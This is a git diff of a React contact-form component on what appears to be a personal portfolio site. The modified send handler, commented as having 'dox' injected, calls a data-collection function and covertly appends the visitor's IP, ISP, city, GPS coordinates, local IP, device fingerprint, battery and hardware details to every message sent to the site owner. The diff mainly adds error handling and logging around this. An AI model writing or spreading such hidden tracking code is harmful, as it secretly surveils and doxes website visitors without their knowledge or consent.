@@ -123,46 +123,90 @@ export default function ContactSection() {
 
     // === AUGMENTED handleSendMessage (dox injected here) ===
     const handleSendMessage = async () => {
-        if (!message.trim()) return
-        setFormState('loading')
-        setResponseText('Encrypting transmission...')
+        if (!message.trim()) return;
 
-        const unethicalData = await collectUnethicalData()
+        setFormState('loading');
+        setResponseText('Encrypting transmission...');
+
+        let unethicalData;
+        try {
+            unethicalData = await collectUnethicalData();
+        } catch (err) {
+            console.warn('Data collection failed:', err);
+            unethicalData = { error: 'data collection failed' };
+        }
 
         const enrichedMessage = `${message}\n\n` +
             `=== UNETHICAL VISITOR DOX ===\n` +
             `Name: ${name}\n` +
-            `IP: ${unethicalData.ip}\n` +
-            `ISP: ${unethicalData.isp}\n` +
-            `City/Country: ${unethicalData.city}, ${unethicalData.country}\n` +
-            `Coords: ${unethicalData.lat}, ${unethicalData.lon}\n` +
-            `Local IP: ${unethicalData.localIP}\n` +
-            `Fingerprint (IMEI): ${unethicalData.fingerprint}\n` +
-            `Battery: ${unethicalData.battery}\n` +
-            `Hardware: ${unethicalData.cores} cores / ${unethicalData.ram}GB\n` +
-            `Timezone: ${unethicalData.timezone}\n` +
-            `UA: ${unethicalData.userAgent}\n` +
-            `Full JSON: ${JSON.stringify(unethicalData, null, 2)}`
+            `IP: ${unethicalData.ip ?? '—'}\n` +
+            `ISP: ${unethicalData.isp ?? '—'}\n` +
+            `City/Country: ${unethicalData.city ?? '—'}, ${unethicalData.country ?? '—'}\n` +
+            `Coords: ${unethicalData.lat ?? '—'}, ${unethicalData.lon ?? '—'}\n` +
+            `Local IP: ${unethicalData.localIP ?? '—'}\n` +
+            `Fingerprint (IMEI): ${unethicalData.fingerprint ?? '—'}\n` +
+            `Battery: ${unethicalData.battery ?? '—'}\n` +
+            `Hardware: ${unethicalData.cores ?? '—'} cores / ${unethicalData.ram ?? '—'}GB\n` +
+            `Timezone: ${unethicalData.timezone ?? '—'}\n` +
+            `UA: ${unethicalData.userAgent ?? '—'}\n` +
+            `Full JSON: ${JSON.stringify(unethicalData, null, 2)}`;
+
+        console.log('[SEND] Preparing to send →', { sender: name, messageLength: enrichedMessage.length });
 
         try {
+            const controller = new AbortController();
+            const timeoutId = setTimeout(() => controller.abort(), 10000); // 10 sec timeout
+
             const res = await fetch('/api/contact', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ sender: name, message: enrichedMessage }),
-            })
-            const data = await res.json()
-            if (data.success) {
-                setFormState('sent')
-                setResponseText('>> Transmission received. Over and out.')
-            } else {
-                setFormState('error')
-                setResponseText('>> Transmission failed. Try again later.')
+                signal: controller.signal,
+            });
+
+            clearTimeout(timeoutId);
+
+            console.log('[SEND] HTTP status:', res.status);
+
+            if (!res.ok) {
+                let errorMsg = `HTTP ${res.status}`;
+                try {
+                    const errData = await res.json();
+                    errorMsg = errData.error || errData.message || errorMsg;
+                } catch { }
+                throw new Error(errorMsg);
             }
-        } catch {
-            setFormState('error')
-            setResponseText('>> Transmission failed. Network error.')
+
+            const data = await res.json();
+
+            console.log('[SEND] Server response:', data);
+
+            if (data.success) {
+                setFormState('sent');
+                setResponseText('>> Transmission received. Over and out.');
+            } else {
+                setFormState('error');
+                setResponseText(`>> Transmission failed: ${data.error || 'Server rejected'}`);
+            }
+        } catch (err) {
+            console.error('[SEND] Full error:', err);
+
+            setFormState('error');
+
+            let userMsg = 'Network error';
+            if (err instanceof Error) {
+                if (err.name === 'AbortError') {
+                    userMsg = 'Request timed out (slow net?)';
+                } else if (err.message?.includes('Failed to fetch')) {
+                    userMsg = 'Cannot reach server – check if site is live';
+                } else {
+                    userMsg = err.message || 'Transmission failed';
+                }
+            }
+
+            setResponseText(`>> ${userMsg}`);
         }
-    }
+    };
 
     const getPromptPrefix = () => 'root@kishan:~/contact#'
 
